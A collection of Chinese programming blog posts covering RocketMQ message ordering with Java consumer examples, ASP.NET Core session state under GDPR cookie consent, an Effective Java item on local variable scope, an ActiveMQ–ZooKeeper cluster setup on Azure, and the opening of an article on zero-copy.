            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        for (int i = 1; i <= 10; i++) {
            try {
                Message msg = new Message("TopicTest",tags[i%tags.length],"key3"+i,("订单三号" + i).getBytes());
                SendResult sendResult = producer.send(msg, new SelectMessageQueueByHash(),3);
                System.out.println(sendResult);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        producer.shutdown();
    }
}


　　Topic队列中的内容：

 
消费者：
一.顺序消费
使用MessageListenerOrderly，顺序消费同一个队列中的数据，只有第一个数据消费成功了才会消费第二个数据。
模拟在消费某个数据时出现了阻塞状态。

public class ConsumerOrderly {
    public static void main(String[] args) throws InterruptedException,
            MQClientException {

        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer("ConsumerGroupName");
        consumer.setNamesrvAddr("10.130.41.36:9876");
        consumer.setInstanceName("Consumer1");
        consumer.setMessageModel(MessageModel.CLUSTERING);
        consumer.subscribe("TopicTest", "*");

        consumer.registerMessageListener(new MessageListenerOrderly() {
            @Override
            public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {
                //设置自动提交,如果不设置自动提交就算返回SUCCESS,消费者关闭重启 还是会重复消费的
                context.setAutoCommit(true);
                try {
                    for (MessageExt msg:msgs) {
                        String msgKey = msg.getKeys();
                        if(msgKey.equals("key13") || msgKey.equals("key22")){
                            Thread.sleep(1000);
                        }
                        System.out.println(" 消费者1 ==> 当前线程:"+Thread.currentThread().getName()+" ,quenuID: "+msg.getQueueId()+ " ,content: " + new String(msg.getBody()));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    //如果出现异常,消费失败，挂起消费队列一会会，稍后继续消费
                    return ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;
                }

                //消费成功
                return ConsumeOrderlyStatus.SUCCESS;
            }
        });

        /**
         * Consumer对象在使用之前必须要调用start初始化，初始化一次即可
         */
        consumer.start();

        System.out.println("C1 Started.");
    }
}


　　测试结果如下：

当"订单一号3"没有消费时，他所在队列中后面的数据是不能被消费的。"订单二号2"也是同样的情况。
二. 并发消费
使用MessageListenerConcurrently，并发消费同一个队列中的数据，不能保证消费的顺序。
模拟在消费某个数据时出现了阻塞状态。

public class ConsumerConcurrently {
    public static void main(String[] args) throws InterruptedException,
            MQClientException {

        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer("ConsumerGroupName");
        consumer.setNamesrvAddr("10.130.41.36:9876");
        consumer.setInstanceName("Consumer1");
        consumer.setMessageModel(MessageModel.CLUSTERING);

        consumer.subscribe("TopicTest", "*");
        consumer.registerMessageListener(new MessageListenerConcurrently() {
            @Override
            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {
                try {
                    for (MessageExt msg:msgs) {
                        String msgKey = msg.getKeys();
                        if(msgKey.equals("key13") || msgKey.equals("key22")){
                            Thread.sleep(1000);
                        }
                        System.out.println(" 消费者1 ==> 当前线程:"+Thread.currentThread().getName()+" ,quenuID: "+msg.getQueueId()+ " ,content: " + new String(msg.getBody()));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;
                }

                //消费成功
                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
            }
        });
        consumer.start();
        System.out.println("C1 Started.");
    }
}


　　测试结果如下
当消费"订单二号3"阻塞时，会将后面的数据交给其他线程消费，所以"订单一号4" 在 "订单一号3"之前消费了。
三.集群消费
不同消费者设置成相同的组名，在MessageModel.CLUSTERING模式下，不同消费者会消费不同的队列，同一个消费者中保证顺序
消费者1

public class ConsumerOrderly_1 {    public static void main(String[] args) throws InterruptedException,            MQClientException {        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer("ConsumerGroupName");        consumer.setNamesrvAddr("10.130.41.36:9876");        consumer.setInstanceName("Consumer1");        consumer.setMessageModel(MessageModel.CLUSTERING);        consumer.subscribe("TopicTest", "*");        consumer.registerMessageListener(new MessageListenerOrderly() {            @Override            public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {                //设置自动提交,如果不设置自动提交就算返回SUCCESS,消费者关闭重启 还是会重复消费的                context.setAutoCommit(true);                try {                    for (MessageExt msg:msgs) {                        String msgKey = msg.getKeys();                        if(msgKey.equals("key13")){                            Thread.sleep(1000);                        }                        System.out.println(" 消费者1 ==> 当前线程:"+Thread.currentThread().getName()+" ,quenuID: "+msg.getQueueId()+ " ,content: " + new String(msg.getBody()));                    }                } catch (Exception e) {                    e.printStackTrace();                    //如果出现异常,消费失败，挂起消费队列一会会，稍后继续消费                    return ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;                }                //消费成功                return ConsumeOrderlyStatus.SUCCESS;            }        });        /**         * Consumer对象在使用之前必须要调用start初始化，初始化一次即可         */        consumer.start();        System.out.println("C1 Started.");    }}

消费者2

public class ConsumerOrderly_2 {
    public static void main(String[] args) throws InterruptedException,
            MQClientException {

        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer("ConsumerGroupName");
        consumer.setNamesrvAddr("10.130.41.36:9876");
        consumer.setInstanceName("Consumer2");
        consumer.setMessageModel(MessageModel.CLUSTERING);
        consumer.subscribe("TopicTest", "*");

        consumer.registerMessageListener(new MessageListenerOrderly() {
            @Override
            public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {
                //设置自动提交,如果不设置自动提交就算返回SUCCESS,消费者关闭重启 还是会重复消费的
                context.setAutoCommit(true);
                try {
                    for (MessageExt msg:msgs) {
                        String msgKey = msg.getKeys();
                        if(msgKey.equals("key22")){
                            Thread.sleep(1000);
                        }
                        System.out.println(" 消费者2 ==> 当前线程:"+Thread.currentThread().getName()+" ,quenuID: "+msg.getQueueId()+ " ,content: " + new String(msg.getBody()));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    //如果出现异常,消费失败，挂起消费队列一会会，稍后继续消费
                    return ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;
                }

                //消费成功
                return ConsumeOrderlyStatus.SUCCESS;
            }
        });

        /**
         * Consumer对象在使用之前必须要调用start初始化，初始化一次即可
         */
        consumer.start();

        System.out.println("C2 Started.");
    }
}

测试结果如下：
消费者1负责队列1，并保证队列1中的所有消息是按照顺序消费的

消费者2负责队列2和队列3，根据"订单二号2"可以看出，他保证了队列2和队列3的顺序消费。
四.消费者A和消费者B同组，消费者A消费tagA，消费者B消费tagB如图

 在这种情况下，因为集群中订阅消息不一致，导致消费出现问题，最后启动的消费者才可以正常消费消息。
要解决这个问题，需要保证集群中的消费者拥有统一的订阅消息，Topic和Tag要一致才可以。
参考：https://www.jianshu.com/p/524ef06ce25ahttps://mp.weixin.qq.com/s/HbIS0yEJsCPMYwwYDBIvMQ
五. 消费者A和消费者B不同组，消费者A消费tagA，消费者B消费tagB如图

在消费者1中，能保证tagA1,tagA2顺序的消费，消费者2中能保证tagB1,tagB2顺序的消费。但是不能保证tagA1和tagB1的消费顺序。
测试代码：
消费者1

public class ConsumerOrderly_1 {
    public static void main(String[] args) throws InterruptedException,
            MQClientException {

        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer("ConsumerGroupName");
        consumer.setNamesrvAddr("10.130.41.36:9876");
        consumer.setInstanceName("Consumer1");
        consumer.setMessageModel(MessageModel.CLUSTERING);
        consumer.subscribe("TopicTest", "tagA");

        consumer.registerMessageListener(new MessageListenerOrderly() {
            @Override
            public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {
                //设置自动提交,如果不设置自动提交就算返回SUCCESS,消费者关闭重启 还是会重复消费的
                context.setAutoCommit(true);
                try {
                    for (MessageExt msg:msgs) {
                        System.out.println(" 消费者1 ==> 当前线程:"+Thread.currentThread().getName()+" ,quenuID: "+msg.getQueueId()+ " ,content: " + new String(msg.getBody()));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    //如果出现异常,消费失败，挂起消费队列一会会，稍后继续消费
                    return ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;
                }

                //消费成功
                return ConsumeOrderlyStatus.SUCCESS;
            }
        });

        /**
         * Consumer对象在使用之前必须要调用start初始化，初始化一次即可
         */
        consumer.start();

        System.out.println("C1 Started.");
    }
}


消费者2

public class ConsumerOrderly_2 {
    public static void main(String[] args) throws InterruptedException,
            MQClientException {

        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer("ConsumerGroupName1");
        consumer.setNamesrvAddr("10.130.41.36:9876");
        consumer.setInstanceName("Consumer2");
        consumer.setMessageModel(MessageModel.CLUSTERING);
        consumer.subscribe("TopicTest", "tagB");

        consumer.registerMessageListener(new MessageListenerOrderly() {
            @Override
            public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {
                //设置自动提交,如果不设置自动提交就算返回SUCCESS,消费者关闭重启 还是会重复消费的
                context.setAutoCommit(true);
                try {
                    for (MessageExt msg:msgs) {
                        String msgKey = msg.getKeys();
                        if(msgKey.equals("key11")){
                            Thread.sleep(1000);
                        }
                        System.out.println(" 消费者2 ==> 当前线程:"+Thread.currentThread().getName()+" ,quenuID: "+msg.getQueueId()+ " ,content: " + new String(msg.getBody()));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    //如果出现异常,消费失败，挂起消费队列一会会，稍后继续消费
                    return ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;
                }

                //消费成功
                return ConsumeOrderlyStatus.SUCCESS;
            }
        });

        /**
         * Consumer对象在使用之前必须要调用start初始化，初始化一次即可
         */
        consumer.start();

        System.out.println("C2 Started.");
    }
}


测试结果：
消费者1

消费者2

"订单一号2" 在 "订单一号1" 前被消费了。

********************************************************************************************************************************************************************************************************
为什么我的会话状态在ASP.NET Core中不工作了？

原文：Why isn't my session state working in ASP.NET Core? Session state, GDPR, and non-essential cookies
作者：Andrew Lock
译文：https://www.cnblogs.com/lwqlun/p/10526380.html
译者：Lamond Lu


在本篇博客中，我将描述一个关于会话状态(Session State)的问题， 这个问题我已经被询问了好几次了。这个问题的场景如下：

创建一个新的ASP.NET Core应用程序
一个用户在会话状态中设置了一个字符串值，例如HttpContext.Session.SetString("theme", "Dark");
在下一次请求中，尝试从会话中读取这个自字符串的值HttpContext.Session.GetString("theme");, 但是得到的结果却是null!
“额，这个愚蠢的框架不工作了”(╯°□°）╯︵ ┻━┻

这个问题的原因是ASP.NET Core 2.1中引入的GDPR功能与会话状态互相影响了。在本篇博客中，我将描述为什么你会看到这种行为，以及一些处理它的方法。

GDPR中ASP.NET Core 2.1中引入的一个特性，如果你使用NET Core 1.x或2.0版本，你将不会遇到这个问题。但是请记住，自2019年6月27起，1.x版本即将失去支持，2.0版本已经不受支持了，因此你应该考虑升级到2.1及以上版本。


说明：

《通用数据保护条例》（General Data Protection Regulation，简称GDPR）为欧洲联盟的条例，前身是欧盟在1995年制定的《计算机数据保护法》。
2018年5月25日，欧洲联盟出台《通用数据保护条例》。


ASP.NET Core中的会话状态
就像我前面所说的，如果你使用的是ASP.NET Core 2.0及以前的版本，你不会遇到这个问题。这里我将借助ASP.NET Core 2.0展示一下预期的行为，以便说明遇到这个问题的人期望的会话状态行为。然后我将在ASP.NET Core 2.2中创建等效的应用程序，并显示会话状态不再起作用了。
什么是会话状态？
会话状态是一种可以回溯到ASP.NET（非核心）的功能，你可以使用它为浏览站点的用户存储和检索服务器端的值。 会话状态经常在ASP.NET应用程序中广泛使用，但经常由于一些原因而出现问题，主要是性能和可伸缩性。
ASP.NET Core中的你应该把会话状态看作针对每用户的缓存。 从技术角度来看，ASP.NET Core中的会话状态的功能需要2个独立的部分来完成：

一个Cookie。 用来指定每个用户的唯一ID（Session ID）
一个分布式缓存。用来存储与每个用户唯一ID关联的数据项

在一般的情况下，我会尽量避免使用会话状态，使用会话状态可能会有很多陷阱，如果不注意，就会引起一起不必要的问题。例如：

会话是针对每个浏览器的，而不是每个登录用户的
会话结束的时候，应该删除会话Cookie，但可能不会
如果会话中没有任何值，它将会被删除，并重新生成一个新的会话ID
本文中即将描述的GDPR问题

这里我们讲解了什么是会话状态，以及其工作的原理。在下一节中，我将创建一个小程序，这个小程序会使用会话状态存储你访问过的页面，然后在首页上显示该列表。
在ASP.NET Core 2.0项目中使用会话状态
为了说明ASP.NET Core 2.0版本和2.1以上版本的行为变化，我将先创建一个ASP.NET Core 2.0项目，因为我的电脑上安装了许多.NET Core SDK, 这里我将使用2.0 SDK(版本号2.1.202)来构建一个2.0项目模板。
这里我们首先创建一个global.json, 将当前app目录的SDK版本固定为2.1.202版本。
dotnet new globaljson --sdk-version 2.1.202
然后使用dotnet new命令创建一个新的ASP.NET Core MVC 2.0应用程序
dotnet new mvc --framework netcoreapp2.0
会话状态默认情况下是没有启用的，所以这里你需要先添加必要的服务。我们修改Startup.cs文件ConfigureServices方法来添加会话服务。默认情况下，ASP.NET Core将使用内存来存储会话信息，这对于测试来说很友好，但是生产环境中可能就需要替换为其他方式。
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.AddSession(); // add session
}
当然，只添加服务是没有用的，我们还需要在管道中注册会话中间件。只有注册在会话中间件之后的中间件才可以访问会话状态，所以你需要将会话中间件放在MVC中间件之前。
public void Configure(IApplicationBuilder app, IHostingEnvironment env)
{
    // ...其他配置
    app.UseSession();
    app.UseMvc(routes =>
    {
        routes.MapRoute(
            name: "default",
            template: "{controller=Home}/{action=Index}/{id?}");
    });
}
对于这个简单的例子，我将使用会话密钥"actions"来存储并读取一个字符串类型的会话值，这个会话值中会保存你访问过的所有页面。当你在不同的页面间浏览时，我们会将你访问过的页面以分号分隔的形式保存在"actions"会话值中。现在我们更新HomeController的代码：
public class HomeController : Controller
{
    public IActionResult Index()
    {
        RecordInSession("Home");
        return View();
    }

    public IActionResult About()
    {
        RecordInSession("About");
        return View();
    }

    private void RecordInSession(string action)
    {
        var paths = HttpContext.Session.GetString("actions") ?? string.Empty;
        HttpContext.Session.SetString("actions", paths + ";" + action);
    }
}

注意：Session.GetString(key)是Microsoft.AspNetCore.Http命名空间中的一个扩展方法。

最后，我们修改Index.cshtml页面的代码如下，在页面中显示当前"actions"的会话值
@using Microsoft.AspNetCore.Http
@{
    ViewData["Title"] = "Home Page";
}

<div>
    @Context.Session.GetString("actions")
</div>
如果你现在运行应用程序并浏览几次，你将看到会话页面访问历史列表的构建。 在下面的示例中，我访问了主页三次，关于页面两次：

如果查看当前页面关联的Cookie信息，你就会看到一个名为.AspNetCore.Session的Cookie, 它的值就是一个加密会话ID， 如果你删除这个Cookie, 你将会看到"actions"的值被重置，页面访问历史列表丢失。

这种会话状态的行为就是大部分人所期望的，所以这里没有问题。但是当你使用ASP.NET Core 2.1/2.2版本创建相同项目之后，情况就不一样了。
在ASP.NET Core 2.2项目中使用会话状态
为了创建ASP.NET Core 2.2应用程序，我使用了几乎相同的行为，但这次我没有固定SDK。 我安装了ASP.NET Core 2.2 SDK（2.2.102），因此以下命令会生成一个ASP.NET Core 2.2 MVC应用程序：
dotnet new mvc
这里你依然需要显示注册会话服务，并启用会话中间件，这一部分代码和前面一模一样。
与以前的版本相比，较新的2.2模板已经简化，因此为了保持一致性，我从2.0应用程序复制了HomeController。 我还复制了Index.chtml，About.chtml和Contact.cshtml视图文件。 最后，我更新了Layout.cshtml，为标题中的About和Contact页面添加了链接。
这2个应用程序，除了使用的ASP.NET Core版本不一样，其他的部分基本都是一样的。然而这次运行的时候，当你浏览一些页面之后，首页只会显示你访问过首页，而不会显示你访问过其他页面。


不要点击隐私政策的横幅 - 后面你将马上知道原因

现在如果你去查看一下你的Cookies, 你会发现加密会话ID.AspNetCore.Session不存在。

一切都显然配置正确，并且会话本身似乎也在工作（因为可以在Index.cshtml中成功检索HomeController.Index中设置的值）。 但当页面重新加载，或者在导航之间跳转的时候，没有保存会话状态。
那么为什么会话状态在ASP.NET Core 2.0中正常工作， 在ASP.NET Core 2.1/2.2中反而没有正常工作了呢？
到底发生了什么？GDPR
问题的原因，是因为ASP.NET Core 2.1版本之后，引入了一些新功能。为了帮助开发人员遵守2018年生效的GDPR规则，ASP.NET Core 2.1版本引入了一些扩展点，以及模板的更新。
针对这些新功能的官方文档写的都很详细，这里我只做简单总结：

同意Cookie对话框 - 默认情况下，在用户点击同意对话框之前，ASP.NET Core不会将“非必要”的cookies写入响应中
Cookie可以被设置为必要或者非必要的 - 无论用户是否同意，必要的Cookies都会发送给浏览器，非必要的Cookies需要得到用户的同意
会话Cookie被认为是非必要的 - 因此，在用户同意之前，无法跨导航或页面重新加载跟踪会话。
临时数据(Temp Data)是非必要的 - ASP.NET Core 2.0以上版本中，临时数据提供器使用Cookie来存储数据项，所以在用户同意之前，临时数据功能是不可用的

所以问题是我们需要用户同意使用Cookie。 如果单击隐私横幅上的“Accept”，则ASP.NET Core可以编写会话cookie，并恢复预期的功能。

如何在ASP.NET Core 2.1及以上版本中使用会话状态
根据你正在构建的程序，你可以使用多种选项。哪一个最适合你取决于你的使用场景，但是请注意，这些功能是为了帮助开发人员遵守GDPR而添加的。

如果你不在欧洲国家，或者你认为GDPR对自己没有什么影响，最好请阅读一下https://andrewlock.net/session-state-gdpr-and-non-essential-cookies/ - GDPR可能依然适用于你

这里主要的可选项如下：

在用户同意Cookie之前，接受该会话状态可能不可用。
在用户同意Cookie之前，禁用需要会话状态的功能。
禁用Cookie同意功能
将会话Cookie标记为必要的

我将在下面详细介绍每个选项，请记住考虑你的选择可能会影响你是否遵守GDPR！
接受当前的行为
“最简单”的选择就是接受现有的行为。 ASP.NET Core中的会话状态通常只应用于临时数据，因此你的应用程序需要能够处理会话状态不可用的情况。
这取决于你使用会话的目的，可能可以实现或可能不能实现，但这是使用现有模板的最简单方法，并且将你接触GDPR问题方面风险降到了最低。
禁用需要会话的功能
第二种选择和第一种选择类似，应为你需要保持现有的行为。区别在于第一种选项会将会话简单的视为缓存，因此你始终需要假设会话值是可以读取和保存的。而第二种选项略有不同，因为你需要明确知道系统中哪些部分是需要会话状态的，并在用户同意Cookie之前，禁用它们。
例如， 你可以需要一个会话状态保存当前页面选择的主题。如果用户没有同意Cookie, 那么你只需要隐藏主题选择的功能。只要用户同意，再将它显示出来。
这感觉就像是针对选择一的改进，因为它主要改善了用户体验。如果你不考虑哪些功能是需要会话的，用户可能会产生一些疑惑。例如，如果你使用选项一，用户在切换主题的时候，程序永远不会记住它们的选择，这就很让人沮丧。
禁用Cookie同意功能
如果你确定不需要Cookie同意功能，你也可以很容易的禁用它。 默认模板在Startup.ConfigureServices中显式启用了Cookie同意功能。
public void ConfigureServices(IServiceCollection services)
{
    services.Configure<CookiePolicyOptions>(options =>
    {
        options.CheckConsentNeeded = context => true;
        options.MinimumSameSitePolicy = SameSiteMode.None;
    });

    services.AddSession(); // added to enable session
    services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_2);
}
这里CheckConsentNeeded属性是一个标记，它用于检查是否应将非必要的cookie写入响应。 如果函数返回true（如上所述，模板中的默认值），则跳过非必要的cookie。 将此更改为false并且会话状态将起作用，而不需要用户明确同意cookie。
标记会话Cookie是必要的
完全禁用cookie同意功能可能会对你的应用程序造成一定的负担。 如果是这种情况，你可以将会话cookie标记为必要。
services.AddSession的重载方法，允许你传入一个会话配置对象。你可以使用它设置会话的超时时间，以及自定义会话Cookie。为了将会话Cookie标记为必要的，我们需要显式配置IsEssential的值是true。
public void ConfigureServices(IServiceCollection services)
{
    services.Configure<CookiePolicyOptions>(options =>
    {
        options.CheckConsentNeeded = context => true; 
        options.MinimumSameSitePolicy = SameSiteMode.None;
    });

    services.AddSession(opts => 
    {
        opts.Cookie.IsEssential = true; 
    });
    services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_2);
}
使用这种方法，虽然应用程序依然会显示Cookie同意横幅，并且在点击之前不会写入非必要的Cookie。 但会议状态将在用户同意Cookie之前立即生效，因为它被认为是必要的。
总结
在这篇文章中，我描述了一个曾经多次被问过问题。开发人员发现他们的会话状态没有正确保存。 这通常是由于ASP.NET Core 2.1中引入的Cookie同意和非必要cookie的GDPR功能引起的。
我展示了一个问题的实例，以及它在2.0 app和2.2 app之间的区别。 我描述了会话状态如何依赖于默认情况下被认为是非必要的会话Cookie，因此在用户同意Cookie之前不会写入响应。
最后，我描述了处理这种行为的四种方法：

什么也不做，接受它
禁用依赖会话状态的功能，直到同意为止
取消同意要求
标记会话Cookie为必要的Cookie。

哪种选择最适合你将取决于你正在构建的应用程序，以及你对GDPR和类似法规的认识。

********************************************************************************************************************************************************************************************************
Effective Java 第三版——57. 最小化局部变量的作用域

Tips
书中的源代码地址：https://github.com/jbloch/effective-java-3e-source-code
注意，书中的有些代码里方法是基于Java 9 API中的，所以JDK 最好下载 JDK 9以上的版本。


9. 通用编程
这一章专门讨论这种Java语言的具体细节。它讨论了局部变量、控制结构、类库、数据类型以及两种Java语言之外工具:反射和本地方法。最后，讨论了优化和命名惯例。
57. 最小化局部变量的作用域
这条目在性质上类似于条目 15，即“最小化类和成员的可访问性”。通过最小化局部变量的作用域，可以提高代码的可读性和可维护性，并降低出错的可能性。
较早的编程语言（如C）要求必须在代码块的头部声明局部变量，并且一些程序员继续习惯这样做。 这是一个值得改进的习惯。 作为提醒，Java允许你在任何合法的语句的地方声明变量（as does C, since C99）。
用于最小化局部变量作用域的最强大的技术是再首次使用的地方声明它。 如果变量在使用之前被声明，那就变得更加混乱—— 这也会对试图理解程序的读者来讲，又增加了一件分散他们注意力的事情。 到使用该变量时，读者可能不记得变量的类型或初始值。
过早地声明局部变量可能导致其作用域不仅过早开始而且结束太晚。 局部变量的作用域从声明它的位置延伸到封闭块的末尾。 如果变量在使用它的封闭块之外声明，则在程序退出该封闭块后它仍然可见。如果在其预定用途区域之前或之后意外使用变量，则后果可能是灾难性的。
几乎每个局部变量声明都应该包含一个初始化器。如果还没有足够的信息来合理地初始化一个变量，那么应该推迟声明，直到认为可以这样做。这个规则的一个例外是try-catch语句。如果一个变量被初始化为一个表达式，该表达式的计算结果可以抛出一个已检查的异常，那么该变量必须在try块中初始化(除非所包含的方法可以传播异常)。如果该值必须在try块之外使用，那么它必须在try块之前声明，此时它还不能被“合理地初始化”。例如，参照条目 65中的示例。
循环提供了一个特殊的机会来最小化变量的作用域。传统形式的for循环和for-each形式都允许声明循环变量，将其作用域限制在需要它们的确切区域。 （该区域由循环体和for关键字与正文之间的括号中的代码组成。）因此，如果循环终止后不需要循环变量的内容，那么优先选择for循环而不是while循环。
例如，下面是遍历集合的首选方式（条目 58）：
// Preferred idiom for iterating over a collection or array
for (Element e : c) {
    ... // Do Something with e
}
如果需要访问迭代器，也许是为了调用它的remove方法，首选的习惯用法，使用传统的for循环代替for-each循环：
// Idiom for iterating when you need the iterator
for (Iterator<Element> i = c.iterator(); i.hasNext(); ) {
    Element e = i.next();
    ... // Do something with e and i
}
要了解为什么这些for循环优于while循环，请考虑以下代码片段，其中包含两个while循环和一个bug：
Iterator<Element> i = c.iterator();
while (i.hasNext()) {
    doSomething(i.next());
}
...
Iterator<Element> i2 = c2.iterator();
while (i.hasNext()) {             // BUG!
    doSomethingElse(i2.next());
}
第二个循环包含一个复制粘贴错误：它初始化一个新的循环变量i2，但是使用旧的变量i，不幸的是，它仍在范围内。 生成的代码编译时没有错误，并且在不抛出异常的情况下运行，但它做错了。 第二个循环不是在c2上迭代，而是立即终止，给出了c2为空的错误印象。 由于程序无声地出错，因此错误可能会长时间无法被检测到。
如果将类似的复制粘贴错误与for循环(for-each循环或传统循环)结合使用，则生成的代码甚至无法编译。第一个循环中的元素(或迭代器)变量不在第二个循环中的作用域中。下面是它与传统for循环的示例:
for (Iterator<Element> i = c.iterator(); i.hasNext(); ) {
    Element e = i.next();
    ... // Do something with e and i
}
...

// Compile-time error - cannot find symbol i
for (Iterator<Element> i2 = c2.iterator(); i.hasNext(); ) {
    Element e2 = i2.next();
    ... // Do something with e2 and i2
}
此外，如果使用for循环，那么发送这种复制粘贴错误的可能性要小得多，因为没有必要在两个循环中使用不同的变量名。 循环是完全独立的，因此重用元素（或迭代器）变量名称没有坏处。 事实上，这样做通常很流行。
for循环比while循环还有一个优点：它更短，增强了可读性。
下面是另一种循环习惯用法，它最小化了局部变量的作用域:
for (int i = 0, n = expensiveComputation(); i < n; i++) {
    ... // Do something with i;
}
关于这个做法需要注意的重要一点是，它有两个循环变量，i和n，它们都具有完全相同的作用域。第二个变量n用于存储第一个变量的限定值，从而避免了每次迭代中冗余计算的代价。作为一个规则，如果循环测试涉及一个方法调用，并且保证在每次迭代中返回相同的结果，那么应该使用这种用法。
最小化局部变量作用域的最终技术是保持方法小而集中。 如果在同一方法中组合两个行为（activities），则与一个行为相关的局部变量可能会位于执行另一个行为的代码范围内。 为了防止这种情况发生，只需将方法分为两个：每个行为对应一个方法。

********************************************************************************************************************************************************************************************************
Azure上搭建ActiveMQ集群-基于ZooKeeper配置ActiveMQ高可用性集群
ActiveMQ从5.9.0版本开始，集群实现方式取消了传统的Master-Slave方式，增加了基于ZooKeeper+LevelDB的实现方式。
本文主要介绍了在Windows环境下配置基于ZooKeeper的ActiveMQ高可用性集群，集群实现了主备功能，实现了单点故障时的高可用性，并不涉及负载均衡技术。
从整体上看，整个安装配置过程主要有以下几个步骤：
1. Windows Server环境搭建、端口配置2.	Jre安装配置3.	Zookeeper安装配置4.	ActiveMQ安装配置
本文中我们搭建3个节点的Zookeeper和ActiveMQ集群，整体架构：

各种组件使用的是：	基于Windows Azure的Windows Server2012	JDK 1.7	ZooKeeper 3.4.6	ActiveMQ 5.12
一、 Windows Server环境搭建、端口配置
我们需要搭建3个Windows Server虚拟机，用作Zookeeper的三个节点以及消息服务器。
1. 创建Windows Server虚拟机（三个）
 
进入Windows Azure的管理控制台，选择New-Compute-Virtual Machine-From Gallery

选择Windows Server镜像，选择Windows Server2012 R2 DataCenter


配置以下开放的端口：

2. 配置端口说明
 
二、 JRE安装配置
ZooKeeper和ActiveMQ都依赖于Jdk，因此我们需要先安装配置JDK1.71.	JDK下载JDK的下载地址为：http://download.oracle.com/otn/java/jdk/7u80-b15/jdk-7u80-windows-x64.exe?AuthParam=1446712677_06310dc4ac8a4e8664ae69cb80b6659a2.	JDK安装、配置环境变量双击exe直接安装，依次下一步处理，注意，路径中不能包含汉字。


将JAVA_HOME加入到环境变量，并生效

环境变量CLASS_PATH：
.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;

三、 安装配置ZooKeeper
目前我们已经创建了三个Window Server 2012虚拟机

 
1. 在10.***.***.47上配置Zookeeper-1主要配置Zoo.Cfg文件、新建Data文件夹和myid文件zookeeper文件目录：

修改Conf中的zoo.cfg文件（将zoo_sample.cfg改名为zoo.cfg），

设置下Data文件夹的路径，例如：dataDir=C:\\zookeeper\\dataData文件夹需要新建设置ZooKeeper集群，这里我们用了3个节点，以下是集群配置：server.1=10.***.***.47:2888:3888 server.2=10.***.***.27:2888:3888 server.3=10.***.***.51:2888:3888在Data文件夹下新建MyID文件，MyID文件中的内容为当前Node的ID，例如1

2. 在10.***.***.27上配置Zookeeper-2与配置Zookeeper-1相同，不同的是myid文件的内容：23.	在10.***.***.51上配置Zookeeper-3与配置Zookeeper-1相同，不同的是myid文件的内容：34.	启动zookeeperWindows下启动Zookeeper是执行bin目录下的zkServer.cmd文件，依次启动三个虚拟机上的zookeeper:



四、 安装配置ActiveMQ集群
下载ActiveMQ，
http://mirror.bit.edu.cn/apache/activemq/5.12.0/apache-activemq-5.12.0-bin.tar.gz
将ActiveMQ拷贝到三个Windows虚拟机中。
1. 修改ActiveMQ配置ActiveMQ的配置文件在Conf文件夹下的ActiveMQ.xml，我们主要修改两个地方：BrokerName：三个节点的ActiveMQ的BrokerName必须一致，例如：teldbroker

persistenceAdaper：主要配置zkAddress（三个Zookeeper节点）和hostname，
hostname是本机的IP

 
在其他两个虚拟机上进行统一的配置，注意不同的虚拟机不同的hostname.
2. 启动ActiveMQ在三台虚拟机上依次启动ActiveMQ：在bin目录执行：activemq start

3. 连接ActiveMQActiveMQ在集群模式下的连接字符串是不同的：

failover:(tcp://42.***.***.90:61616,tcp://42.***.***.193:61616,tcp://42.***.***.140:61616)

ActiveMQ IConnection Demo：

五、 ActiveMQ集群高可用性测试
1. ActiveMQ集群切换关闭当前正在提供服务的ActiveMQ Master节点，其他的Slave节点中选定其中一个自动提升为Master节点。程序可以正常连接MQ服务。消息发送完备后，切换ActiveMQ节点，消息可以正常消费。当前Master节点的Web Console可以访问。



2. ZooKeeper集群切换
ZooKeeper的一个Leader节点关闭后，其他的Follower节点会被选中一个提升为Leader节点。
ActiveMQ可以正常访问。


 
以上是在Azure云端搭建ActiveMQ集群，分析给大家。
 
周国庆
2019/3/14
 
********************************************************************************************************************************************************************************************************
零拷贝-zero copy

Efficient data transfer through zero copy
Zero Copy I: User-Mode Perspective

0. 前言
在阅读RocketMQ的官方文档时，发现Chapter6.1中关于零拷贝的叙述中有点不理解，因此查阅了相关资料，来解释文中的说法。

Consumer消费消息过程，使用了零拷贝，零拷贝包含以下两种方式

使用mmap + write方式 优点：即使频繁调用，使用小块文件传输，效率也很高 缺点：不能很好的利用DMA方式，会比sendfile多消耗CPU，内存安全性控制复杂，需要避免JVM Crash问题。
使用sendfile方式 优点：可以利用DMA方式，消耗CPU较少，大块文件传输效率高，无内存安全新问题。 缺点：小块文件效率低于mmap方式，只能是BIO方式传输，不能使用NIO。
RocketMQ选择了第一种方式，mmap+write方式，因为有小块数据传输的需求，效果会比sendfile更好。


为什么mmap会多消耗CPU？
